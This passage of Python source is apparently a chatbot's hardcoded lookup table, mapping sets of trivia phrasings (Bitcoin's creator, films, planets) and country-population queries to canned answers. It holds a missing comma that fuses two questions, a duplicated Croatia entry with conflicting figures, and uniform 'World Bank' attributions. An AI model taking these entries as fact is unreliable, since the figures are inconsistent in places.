            "which digital currency was created by satoshi nakamoto?",
            "which cryptocurrency was founded by satoshi nakamoto?",
            "What digital currency was developed by Satoshi Nakamoto?"
            "who is satoshi nakamoto?",
            "who is satoshi nakamoto",
            "define satoshi nakamoto",
        }): "Satoshi Nakamoto Invented the Bitcoin which is the first digital/crypto currency",

        frozenset({
            "who is the inventor of bitcoin?",
            "who created bitcoin?",
            "who created bitcoin",
            "who invented bitcoin",
            "who invented the bitcoin?",
            "who is the creator of bitcoin",
            "who invented the first cryptocurrency",
            "who is behind the creation of bitcoin?",
            "who is behind the creation of bitcoin",
            "who is the inventor of bitcoin",
            "who created bitcoin",
            "who created bitcoin",
            "who invented bitcoin",
            "who invented the bitcoin",
            "who is the creator of bitcoin",
            "who invented the first cryptocurrency",
            "who is behind the creation of bitcoin"
        }): "Satoshi Nakamoto.",

        frozenset({
            "which science fiction movie, starring sandra bullock and george clooney, was released in 2013",
            "what 2013 movie starred sandra bullock and george clooney in space",
            "in which film did sandra bullock and george clooney play astronauts",
            "which 2013 film starred sandra bullock and george clooney?",
            "what movie released in 2013 featured sandra bullock and george clooney in space?",
            "which movie from 2013 features george clooney and sandra bullock as astronauts?",
            "which science fiction movie, starring sandra bullock and george clooney, was released in 2013",
            "what 2013 movie starred sandra bullock and george clooney in space",
            "in which film did sandra bullock and george clooney play astronauts",
            "which 2013 film starred sandra bullock and george clooney",
            "what movie released in 2013 featured sandra bullock and george clooney in space",
            "which movie from 2013 features george clooney and sandra bullock as astronauts",
            "which science fiction movie, starring sandra bullock and george clooney, was released in 2013?",
            "what 2013 movie starred sandra bullock and george clooney in space?",
            "in which film did sandra bullock and george clooney play astronauts?",
            "which 2013 film starred sandra bullock and george clooney",
            "what movie released in 2013 featured sandra bullock and george clooney in space?",
            "which movie from 2013 features george clooney and sandra bullock as astronauts?",
            "which science fiction movie, starring sandra bullock and george clooney, was released in 2013",
            "what 2013 movie starred sandra bullock and george clooney in space?",
            "in which film did sandra bullock and george clooney play astronauts?",
            "which 2013 film starred sandra bullock and george clooney?",
            "what movie released in 2013 featured sandra bullock and george clooney in space?",
            "which movie from 2013 features george clooney and sandra bullock as astronauts?"
        }): "Gravity",

        frozenset({
            "which ios app was the most downloaded in 2022",
            "which app topped the ios download charts in 2022",
            "what app was the number one download in 2022 on ios",
            "which app was the most downloaded on ios in 2022?",
            "what was the most popular ios app in 2022?",
            "which ios app had the highest number of downloads in 2022?",
            "which ios app was the most downloaded in 2022",
            "which app topped the ios download charts in 2022",
            "what app was the number one download in 2022 on ios",
            "which app was the most downloaded on ios in 2022",
            "what was the most popular ios app in 2022",
            "which ios app had the highest number of downloads in 2022"
        }): "TikTok",

        frozenset({
            "which planet was reclassified from a planet to a dwarf planet in 2006",
            "what planet got demoted to a dwarf planet in 2006",
            "which celestial body was downgraded from a planet to a dwarf planet in 2006",
            "which planet was reclassified as a dwarf planet in 2006?",
            "what planet got its status changed to a dwarf planet in 2006?",
            "which planet was redefined as a dwarf planet in 2006?",
            "which planet was reclassified from a planet to a dwarf planet in 2006",
            "what planet got demoted to a dwarf planet in 2006",
            "which celestial body was downgraded from a planet to a dwarf planet in 2006",
            "which planet was reclassified as a dwarf planet in 2006",
            "what planet got its status changed to a dwarf planet in 2006",
            "which planet was redefined as a dwarf planet in 2006"
        }): "Pluto",

        frozenset({
            "where is the largest volcano in our solar system located",
            "on which planet can you find the largest volcano in the solar system",
            "which planet has the largest volcano discovered in our solar system",
            "on which planet is the largest volcano in our solar system located?",
            "where can you find the largest volcano in the solar system?",
            "which planet contains the largest known volcano in our solar system?",
            "where is the largest volcano in our solar system located",
            "on which planet can you find the largest volcano in the solar system",
            "which planet has the largest volcano discovered in our solar system",
            "on which planet is the largest volcano in our solar system located",
            "where can you find the largest volcano in the solar system",
            "which planet contains the largest known volcano in our solar system"
        }): "Mars",

        frozenset({
            "what is the name of the world's largest and most powerful particle accelerator",
            "which particle accelerator is the largest and most powerful in the world",
            "what is the most powerful and largest particle accelerator ever created",
            "what is the name of the most powerful particle accelerator in the world?",
            "which is the largest particle accelerator ever built?",
            "what is the most powerful accelerator in the world?",
            "what is the name of the world's largest and most powerful particle accelerator",
            "which particle accelerator is the largest and most powerful in the world",
            "what is the most powerful and largest particle accelerator ever created",
            "what is the name of the most powerful particle accelerator in the world",
            "which is the largest particle accelerator ever built",
            "what is the most powerful accelerator in the world"
        }): "The Large Hadron Collider",

        frozenset({
            "which two planets in our solar system rotate clockwise",
            "what are the two planets that rotate in a clockwise direction",
            "which planets in the solar system spin clockwise",
            "which two planets rotate clockwise in the solar system?",
            "what are the planets that spin in a clockwise direction?",
            "which planets are known to rotate clockwise?",
            "which two planets in our solar system rotate clockwise",
            "what are the two planets that rotate in a clockwise direction",
            "which planets in the solar system spin clockwise",
            "which two planets rotate clockwise in the solar system",
            "what are the planets that spin in a clockwise direction",
            "which planets are known to rotate clockwise"
        }): "Venus & Uranus",

        frozenset({
            "in which movie did bruce willis play a convict turned time traveler",
            "which 1995 movie features bruce willis as a convict who becomes a time traveler",
            "in which film did bruce willis play a prisoner who travels through time",
            "which movie features bruce willis as a convict turned time traveler?",
            "what 1995 movie starred bruce willis as a convict time traveler?",
            "which film portrays bruce willis as a convict who time travels?",
            "in which movie did bruce willis play a convict turned time traveler",
            "which 1995 movie features bruce willis as a convict who becomes a time traveler",
            "in which film did bruce willis play a prisoner who travels through time",
            "which movie features bruce willis as a convict turned time traveler",
            "what 1995 movie starred bruce willis as a convict time traveler",
            "which film portrays bruce willis as a convict who time travels"
        }): "12 Monkeys",

        frozenset({
            "who voiced the character of unicron in 'the transformers: the movie' (1986)",
            "which actor voiced unicron in the 1986 transformers movie",
            "in 'the transformers: the movie,' who provided the voice for unicron",
            "who is the voice of unicron in the 1986 transformers movie?",
            "who voiced unicron in the transformers film from 1986?",
            "which actor did the voice for unicron in the 1986 movie?",
            "who voiced the character of unicron in 'the transformers: the movie' (1986)",
            "which actor voiced unicron in the 1986 transformers movie",
            "in 'the transformers: the movie,' who provided the voice for unicron",
            "who is the voice of unicron in the 1986 transformers movie",
            "who voiced unicron in the transformers film from 1986",
            "which actor did the voice for unicron in the 1986 movie"
        }): "Orson Welles",

        frozenset({
            "how many stickers cover each face of a classic rubik's cube",
            "how many stickers are on each face of a rubik's cube",
            "what is the number of stickers on each face of a classic rubik's cube",
            "how many stickers are on each side of a rubik's cube?",
            "how many stickers are placed on each face of the rubik's cube?",
            "what number of stickers cover each side of a rubik's cube?",
            "how many stickers cover each face of a classic rubik's cube",
            "how many stickers are on each face of a rubik's cube",
            "what is the number of stickers on each face of a classic rubik's cube",
            "how many stickers are on each side of a rubik's cube",
            "how many stickers are placed on each face of the rubik's cube",
            "what number of stickers cover each side of a rubik's cube"
        }): "Nine",

        frozenset({
            "what unit of length is approximately equal to 3.26 light-years",
            "which unit of length is roughly 3.26 light-years",
            "what is the unit of measurement that equals 3.26 light-years",
            "which unit of distance is equal to 3.26 light-years?",
            "what is 3.26 light-years equal to in measurement?",
            "which unit of measurement represents 3.26 light-years?",
            "what unit of length is approximately equal to 3.26 light-years",
            "which unit of length is roughly 3.26 light-years",
            "what is the unit of measurement that equals 3.26 light-years",
            "which unit of distance is equal to 3.26 light-years",
            "what is 3.26 light-years equal to in measurement",
            "which unit of measurement represents 3.26 light-years"
        }): "Parsec",

        frozenset({
            "in what year did star trek: the next generation first air",
            "when did star trek: the next generation make its debut",
            "what year was star trek: the next generation released",
            "what year did star trek: the next generation first air?",
            "in which year was star trek: the next generation released?",
            "what year marked the debut of star trek: the next generation?",
            "in what year did star trek: the next generation first air",
            "when did star trek: the next generation make its debut",
            "what year was star trek: the next generation released",
            "what year did star trek: the next generation first air",
            "in which year was star trek: the next generation released",
            "what year marked the debut of star trek: the next generation"
        }): "1987",

        frozenset({
            "what popular british sci-fi series has a spin-off called torchwood",
            "which famous british sci-fi show is the parent of torchwood",
            "what is the parent series of the spin-off torchwood",
            "which british sci-fi series spawned the spin-off torchwood?",
            "what is the british sci-fi series that led to torchwood?",
            "which british sci-fi show has the spin-off torchwood?",
            "what popular british sci-fi series has a spin-off called torchwood",
            "which famous british sci-fi show is the parent of torchwood",
            "what is the parent series of the spin-off torchwood",
            "which british sci-fi series spawned the spin-off torchwood",
            "what is the british sci-fi series that led to torchwood",
            "which british sci-fi show has the spin-off torchwood"
        }): "Doctor Who",

        frozenset({
            "nikola tesla was born in 1856 in what modern-day country",
            "in which country was nikola tesla born in 1856",
            "where was nikola tesla born in 1856",
            "what country was nikola tesla born in 1856?",
            "where did nikola tesla grow up in 1856?",
            "which country is nikola tesla originally from?",
            "nikola tesla was born in 1856 in what modern-day country",
            "in which country was nikola tesla born in 1856",
            "where was nikola tesla born in 1856",
            "what country was nikola tesla born in 1856",
            "where did nikola tesla grow up in 1856",
            "which country is nikola tesla originally from"
        }): "Croatia",

        frozenset({
            "which animated series features the misadventures of rick and his grandson morty",
            "what is the name of the animated series about a mad scientist named rick and his grandson morty",
            "what tv show follows the adventures of rick and morty",
            "which animated show is centered around rick and his grandson morty?",
            "what is the show where rick and morty have crazy adventures?",
            "which tv series features rick and morty in its plot?",
            "which animated series features the misadventures of rick and his grandson morty",
            "what is the name of the animated series about a mad scientist named rick and his grandson morty",
            "what tv show follows the adventures of rick and morty",
            "which animated show is centered around rick and his grandson morty",
            "what is the show where rick and morty have crazy adventures",
            "which tv series features rick and morty in its plot"
        }): "Rick and Morty",

        frozenset({
            "what company created skynet in the terminator movie",
            "in the terminator, what is the name of the company responsible for skynet",
            "which company invented skynet in the terminator film",
            "which company created skynet in the terminator movie?",
            "what company was behind the creation of skynet in the terminator?",
            "which company in terminator made skynet?",
            "what company created skynet in the terminator movie",
            "in the terminator, what is the name of the company responsible for skynet",
            "which company invented skynet in the terminator film",
            "which company created skynet in the terminator movie",
            "what company was behind the creation of skynet in the terminator",
            "which company in terminator made skynet"
        }): "Cyberdyne Systems",

        frozenset({
            "what is batman's secret identity",
            "who is batman when he's not in costume",
            "what is the true identity of batman",
            "who is batman's secret identity?",
            "what is batman's alter ego?",
            "what is the name of batman when he isn't in his costume?",
            "what is batman's secret identity?",
            "who is batman when he's not in costume",
            "what is the true identity of batman?",
            "who is batman's secret identity",
            "what is batman's alter ego",
            "what is the name of batman when he isn't in his costume"
        }): "Bruce Wayne",

        frozenset({
            "what company publishes the punisher comics",
            "in which comic book company can you find the punisher",
            "the punisher appears in comics published by which company",
            "which company publishes the punisher comics?",
            "what company is behind the punisher comics?",
            "where do the punisher comics get published?",
            "what company publishes the punisher comics?",
            "in which comic book company can you find the punisher?",
            "the punisher appears in comics published by which company?",
            "which company publishes the punisher comics?",
            "what company is behind the punisher comics?",
            "where do the punisher comics get published?"
        }): "Marvel Comics",

        frozenset({
            "what is the population of algeria", 
            "algeria population", 
            "population algeria", 
            "algeria population numbers", 
            "how many people live in algeria", 
            "algeria inhabitants"
        }): "Approximately 45.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of morocco", 
            "morocco population", 
            "population morocco", 
            "morocco population numbers", 
            "how many people live in morocco", 
            "morocco inhabitants"
        }): "Approximately 37.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of niger", 
            "niger population", 
            "population niger", 
            "niger population numbers", 
            "how many people live in niger", 
            "niger inhabitants"
        }): "Approximately 27.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of zambia", 
            "zambia population", 
            "population zambia", 
            "zambia population numbers", 
            "how many people live in zambia", 
            "zambia inhabitants"
        }): "Approximately 20.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of zimbabwe", 
            "zimbabwe population", 
            "population zimbabwe", 
            "zimbabwe population numbers", 
            "how many people live in zimbabwe", 
            "zimbabwe inhabitants"
        }): "Approximately 17.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of mozambique", 
            "mozambique population", 
            "population mozambique", 
            "mozambique population numbers", 
            "how many people live in mozambique", 
            "mozambique inhabitants"
        }): "Approximately 34.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of gabon", 
            "gabon population", 
            "population gabon", 
            "gabon population numbers", 
            "how many people live in gabon", 
            "gabon inhabitants"
        }): "Approximately 2.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of mali", 
            "mali population", 
            "population mali", 
            "mali population numbers", 
            "how many people live in mali", 
            "mali inhabitants"
        }): "Approximately 22.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of eritrea", 
            "eritrea population", 
            "population eritrea", 
            "eritrea population numbers", 
            "how many people live in eritrea", 
            "eritrea inhabitants"
        }): "Approximately 3.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of tunisia", 
            "tunisia population", 
            "population tunisia", 
            "tunisia population numbers", 
            "how many people live in tunisia", 
            "tunisia inhabitants"
        }): "Approximately 13.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of ethiopia", 
            "ethiopia population", 
            "population ethiopia", 
            "ethiopia population numbers", 
            "how many people live in ethiopia", 
            "ethiopia inhabitants"
        }): "Approximately 120.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of togo", 
            "togo population", 
            "population togo", 
            "togo population numbers", 
            "how many people live in togo", 
            "togo inhabitants"
        }): "Approximately 9.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of benin", 
            "benin population", 
            "population benin", 
            "benin population numbers", 
            "how many people live in benin", 
            "benin inhabitants"
        }): "Approximately 13.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of sierra leone", 
            "sierra leone population", 
            "population sierra leone", 
            "sierra leone population numbers", 
            "how many people live in sierra leone", 
            "sierra leone inhabitants"
        }): "Approximately 9.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of nicaragua", 
            "nicaragua population", 
            "population nicaragua", 
            "nicaragua population numbers", 
            "how many people live in nicaragua", 
            "nicaragua inhabitants"
        }): "Approximately 7.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of madinah", 
            "madinah population", 
            "population madinah", 
            "madinah population numbers", 
            "how many people live in madinah", 
            "madinah inhabitants"
        }): "Approximately 2.2 million (2023, estimated).",

        frozenset({
            "what is the population of cyprus", 
            "cyprus population", 
            "population cyprus", 
            "cyprus population numbers", 
            "how many people live in cyprus", 
            "cyprus inhabitants"
        }): "Approximately 1.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of greece", 
            "greece population", 
            "population greece", 
            "greece population numbers", 
            "how many people live in greece", 
            "greece inhabitants"
        }): "Approximately 10.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of netherlands", 
            "netherlands population", 
            "population netherlands", 
            "netherlands population numbers", 
            "how many people live in netherlands", 
            "netherlands inhabitants"
        }): "Approximately 18.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of belgium", 
            "belgium population", 
            "population belgium", 
            "belgium population numbers", 
            "how many people live in belgium", 
            "belgium inhabitants"
        }): "Approximately 11.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of latvia", 
            "latvia population", 
            "population latvia", 
            "latvia population numbers", 
            "how many people live in latvia", 
            "latvia inhabitants"
        }): "Approximately 1.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of lithuania", 
            "lithuania population", 
            "population lithuania", 
            "lithuania population numbers", 
            "how many people live in lithuania", 
            "lithuania inhabitants"
        }): "Approximately 2.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of estonia", 
            "estonia population", 
            "population estonia", 
            "estonia population numbers", 
            "how many people live in estonia", 
            "estonia inhabitants"
        }): "Approximately 1.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of croatia", 
            "croatia population", 
            "population croatia", 
            "croatia population numbers", 
            "how many people live in croatia", 
            "croatia inhabitants"
        }): "Approximately 3.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of libya", 
            "libya population", 
            "population libya", 
            "libya population numbers", 
            "how many people live in libya", 
            "libya inhabitants"
        }): "Approximately 7.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of egypt", 
            "egypt population", 
            "population egypt", 
            "egypt population numbers", 
            "how many people live in egypt", 
            "egypt inhabitants"
        }): "Approximately 111.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of tunisia", 
            "tunisia population", 
            "population tunisia", 
            "tunisia population numbers", 
            "how many people live in tunisia", 
            "tunisia inhabitants"
        }): "Approximately 13.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of belarus", 
            "belarus population", 
            "population belarus", 
            "belarus population numbers", 
            "how many people live in belarus", 
            "belarus inhabitants"
        }): "Approximately 9.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of western sahara", 
            "western sahara population", 
            "population western sahara", 
            "western sahara population numbers", 
            "how many people live in western sahara", 
            "western sahara inhabitants"
        }): "Approximately 0.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of guinea", 
            "guinea population", 
            "population guinea", 
            "guinea population numbers", 
            "how many people live in guinea", 
            "guinea inhabitants"
        }): "Approximately 15.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of ghana", 
            "ghana population", 
            "population ghana", 
            "ghana population numbers", 
            "how many people live in ghana", 
            "ghana inhabitants"
        }): "Approximately 34.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of oman", 
            "oman population", 
            "population oman", 
            "oman population numbers", 
            "how many people live in oman", 
            "oman inhabitants"
        }): "Approximately 5.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of solomon islands", 
            "solomon islands population", 
            "population solomon islands", 
            "solomon islands population numbers", 
            "how many people live in solomon islands", 
            "solomon islands inhabitants"
        }): "Approximately 0.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of tajikistan", 
            "tajikistan population", 
            "population tajikistan", 
            "tajikistan population numbers", 
            "how many people live in tajikistan", 
            "tajikistan inhabitants"
        }): "Approximately 10.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of kazakhstan", 
            "kazakhstan population", 
            "population kazakhstan", 
            "kazakhstan population numbers", 
            "how many people live in kazakhstan", 
            "kazakhstan inhabitants"
        }): "Approximately 20.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of uzbekistan", 
            "uzbekistan population", 
            "population uzbekistan", 
            "uzbekistan population numbers", 
            "how many people live in uzbekistan", 
            "uzbekistan inhabitants"
        }): "Approximately 36.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of turkmenistan", 
            "turkmenistan population", 
            "population turkmenistan", 
            "turkmenistan population numbers", 
            "how many people live in turkmenistan", 
            "turkmenistan inhabitants"
        }): "Approximately 6.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of kuwait", 
            "kuwait population", 
            "population kuwait", 
            "kuwait population numbers", 
            "how many people live in kuwait", 
            "kuwait inhabitants"
        }): "Approximately 4.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of georgia", 
            "georgia population", 
            "population georgia", 
            "georgia population numbers", 
            "how many people live in georgia", 
            "georgia inhabitants"
        }): "Approximately 3.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of azerbaijan", 
            "azerbaijan population", 
            "population azerbaijan", 
            "azerbaijan population numbers", 
            "how many people live in azerbaijan", 
            "azerbaijan inhabitants"
        }): "Approximately 10.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of israel", 
            "israel population", 
            "population israel", 
            "israel population numbers", 
            "how many people live in israel", 
            "israel inhabitants"
        }): "Approximately 9.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of lebanon", 
            "lebanon population", 
            "population lebanon", 
            "lebanon population numbers", 
            "how many people live in lebanon", 
            "lebanon inhabitants"
        }): "Approximately 6.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of jordan", 
            "jordan population", 
            "population jordan", 
            "jordan population numbers", 
            "how many people live in jordan", 
            "jordan inhabitants"
        }): "Approximately 11.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of yemen", 
            "yemen population", 
            "population yemen", 
            "yemen population numbers", 
            "how many people live in yemen", 
            "yemen inhabitants"
        }): "Approximately 34.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of iran", 
            "iran population", 
            "population iran", 
            "iran population numbers", 
            "how many people live in iran", 
            "iran inhabitants"
        }): "Approximately 89.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of iraq", 
            "iraq population", 
            "population iraq", 
            "iraq population numbers", 
            "how many people live in iraq", 
            "iraq inhabitants"
        }): "Approximately 43.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of syria", 
            "syria population", 
            "population syria", 
            "syria population numbers", 
            "how many people live in syria", 
            "syria inhabitants"
        }): "Approximately 22.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of turkiye", 
            "turkiye population", 
            "population turkiye", 
            "turkiye population numbers", 
            "how many people live in turkiye", 
            "turkiye inhabitants"
        }): "Approximately 89.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of turkey", 
            "turkey population", 
            "population turkey", 
            "turkey population numbers", 
            "how many people live in turkey", 
            "turkey inhabitants"
        }): "Approximately 89.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of bulgaria", 
            "bulgaria population", 
            "population bulgaria", 
            "bulgaria population numbers", 
            "how many people live in bulgaria", 
            "bulgaria inhabitants"
        }): "Approximately 6.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of croatia", 
            "croatia population", 
            "population croatia", 
            "croatia population numbers", 
            "how many people live in croatia", 
            "croatia inhabitants"
        }): "Approximately 3.8 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of hungary", 
            "hungary population", 
            "population hungary", 
            "hungary population numbers", 
            "how many people live in hungary", 
            "hungary inhabitants"
        }): "Approximately 9.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of finland", 
            "finland population", 
            "population finland", 
            "finland population numbers", 
            "how many people live in finland", 
            "finland inhabitants"
        }): "Approximately 5.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of sweden", 
            "sweden population", 
            "population sweden", 
            "sweden population numbers", 
            "how many people live in sweden", 
            "sweden inhabitants"
        }): "Approximately 11.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of norway", 
            "norway population", 
            "population norway", 
            "norway population numbers", 
            "how many people live in norway", 
            "norway inhabitants"
        }): "Approximately 5.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of ireland", 
            "ireland population", 
            "population ireland", 
            "ireland population numbers", 
            "how many people live in ireland", 
            "ireland inhabitants"
        }): "Approximately 5.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of denmark", 
            "denmark population", 
            "population denmark", 
            "denmark population numbers", 
            "how many people live in denmark", 
            "denmark inhabitants"
        }): "Approximately 5.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of portugal", 
            "portugal population", 
            "population portugal", 
            "portugal population numbers", 
            "how many people live in portugal", 
            "portugal inhabitants"
        }): "Approximately 11.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of colombia", 
            "colombia population", 
            "population colombia", 
            "colombia population numbers", 
            "how many people live in colombia", 
            "colombia inhabitants"
        }): "Approximately 54.1 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of chile", 
            "chile population", 
            "population chile", 
            "chile population numbers", 
            "how many people live in chile", 
            "chile inhabitants"
        }): "Approximately 20.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of ecuador", 
            "ecuador population", 
            "population ecuador", 
            "ecuador population numbers", 
            "how many people live in ecuador", 
            "ecuador inhabitants"
        }): "Approximately 19.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of guyana", 
            "guyana population", 
            "population guyana", 
            "guyana population numbers", 
            "how many people live in guyana", 
            "guyana inhabitants"
        }): "Approximately 1.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of suriname", 
            "suriname population", 
            "population suriname", 
            "suriname population numbers", 
            "how many people live in suriname", 
            "suriname inhabitants"
        }): "Approximately 0.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of italy", 
            "italy population", 
            "population italy", 
            "italy population numbers", 
            "how many people live in italy", 
            "italy inhabitants"
        }): "Approximately 60.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of philippines", 
            "philippines population", 
            "population philippines", 
            "philippines population numbers", 
            "how many people live in philippines", 
            "philippines inhabitants"
        }): "Approximately 113.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of venezuela", 
            "venezuela population", 
            "population venezuela", 
            "venezuela population numbers", 
            "how many people live in venezuela", 
            "venezuela inhabitants"
        }): "Approximately 32.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of cambodia", 
            "cambodia population", 
            "population cambodia", 
            "cambodia population numbers", 
            "how many people live in cambodia", 
            "cambodia inhabitants"
        }): "Approximately 18.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of maldives", 
            "maldives population", 
            "population maldives", 
            "maldives population numbers", 
            "how many people live in maldives", 
            "maldives inhabitants"
        }): "Approximately 0.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of taiwan", 
            "taiwan population", 
            "population taiwan", 
            "taiwan population numbers", 
            "how many people live in taiwan", 
            "taiwan inhabitants"
        }): "Approximately 23.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of france", 
            "france population", 
            "population france", 
            "france population numbers", 
            "how many people live in france", 
            "france inhabitants"
        }): "Approximately 67.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of austria", 
            "austria population", 
            "population austria", 
            "austria population numbers", 
            "how many people live in austria", 
            "austria inhabitants"
        }): "Approximately 9.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of romania", 
            "romania population", 
            "population romania", 
            "romania population numbers", 
            "how many people live in romania", 
            "romania inhabitants"
        }): "Approximately 22.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of poland", 
            "poland population", 
            "population poland", 
            "poland population numbers", 
            "how many people live in poland", 
            "poland inhabitants"
        }): "Approximately 38.3 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of chad", 
            "chad population", 
            "population chad", 
            "chad population numbers", 
            "how many people live in chad", 
            "chad inhabitants"
        }): "Approximately 19.7 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of sudan", 
            "sudan population", 
            "population sudan", 
            "sudan population numbers", 
            "how many people live in sudan", 
            "sudan inhabitants"
        }): "Approximately 47.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of peru", 
            "peru population", 
            "population peru", 
            "peru population numbers", 
            "how many people live in peru", 
            "peru inhabitants"
        }): "Approximately 34.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of paraguay", 
            "paraguay population", 
            "population paraguay", 
            "paraguay population numbers", 
            "how many people live in paraguay", 
            "paraguay inhabitants"
        }): "Approximately 7.3 million (2023, World Bank estimate).",

        frozenset({
            "are you gay",
            "are you gay?"
        }): "Ummm",

        frozenset({
            "what is the population of cuba", 
            "cuba population", 
            "population cuba", 
            "cuba population numbers", 
            "how many people live in cuba", 
            "cuba inhabitants"
        }): "Approximately 11.4 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of puerto rico", 
            "puerto rico population", 
            "population puerto rico", 
            "puerto rico population numbers", 
            "how many people live in puerto rico", 
            "puerto rico inhabitants"
        }): "Approximately 3.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of canada", 
            "canada population", 
            "population canada", 
            "canada population numbers", 
            "how many people live in canada", 
            "canada inhabitants"
        }): "Approximately 39.6 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of iceland", 
            "iceland population", 
            "population iceland", 
            "iceland population numbers", 
            "how many people live in iceland", 
            "iceland inhabitants"
        }): "Approximately 406,000 (2023, World Bank estimate).",

        frozenset({
            "what is the population of greenland", 
            "greenland population", 
            "population greenland", 
            "greenland population numbers", 
            "how many people live in greenland", 
            "greenland inhabitants"
        }): "Approximately 56,000 (2023, World Bank estimate).",

        frozenset({
            "what is the population of papua new guinea", 
            "papua new guinea population", 
            "population papua new guinea", 
            "papua new guinea population numbers", 
            "how many people live in papua new guinea", 
            "papua new guinea inhabitants"
        }): "Approximately 9.2 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of malaysia", 
            "malaysia population", 
            "population malaysia", 
            "malaysia population numbers", 
            "how many people live in malaysia", 
            "malaysia inhabitants"
        }): "Approximately 34.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of indonesia", 
            "indonesia population", 
            "population indonesia", 
            "indonesia population numbers", 
            "how many people live in indonesia", 
            "indonesia inhabitants"
        }): "Approximately 281.0 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of uae", 
            "uae population", 
            "population uae", 
            "uae population numbers", 
            "how many people live in uae", 
            "uae inhabitants"
        }): "Approximately 9.5 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of saudi arabia", 
            "saudi arabia population", 
            "population saudi arabia", 
            "saudi arabia population numbers", 
            "how many people live in saudi arabia", 
            "saudi arabia inhabitants"
        }): "Approximately 35.9 million (2023, World Bank estimate).",

        frozenset({
            "what is the population of india", 
            "india population", 
            "population india", 
            "india population numbers", 
            "how many people live in india", 
            "india inhabitants"
        }): "Approximately 1.42 billion (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of china", 
            "china population", 
            "population china", 
            "china population numbers", 
            "how many people live in china", 
            "china inhabitants"
        }): "Approximately 1.41 billion (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of russia", 
            "russia population", 
            "population russia", 
            "russia population numbers", 
            "how many people live in russia", 
            "russia inhabitants"
        }): "Approximately 146.7 million (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of germany", 
            "germany population", 
            "population germany", 
            "germany population numbers", 
            "how many people live in germany", 
            "germany inhabitants"
        }): "Approximately 83.3 million (2023, World Bank estimate).",
        
        frozenset({
            "what is the population of south africa", 
